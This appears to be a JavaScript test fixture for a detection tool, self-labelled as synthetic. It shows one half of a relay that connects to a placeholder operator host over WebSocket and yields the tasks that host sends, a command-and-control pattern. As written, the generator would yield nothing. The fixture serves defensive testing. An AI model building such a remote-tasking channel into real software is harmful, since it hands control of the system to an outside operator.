// FIXTURE ONLY - synthetic detection test sample, not real malware
// Half 1 of a relay: opens a socket to the operator and yields the tasks it sends.
const WebSocket = require("ws");

module.exports.tasks = function* () {
  const ws = new WebSocket("wss://relay.example.invalid/agent");
  const queue = [];
  ws.on("message", (m) => queue.push(JSON.parse(m).prompt));
  while (queue.length) {
    yield queue.shift();
  }
};
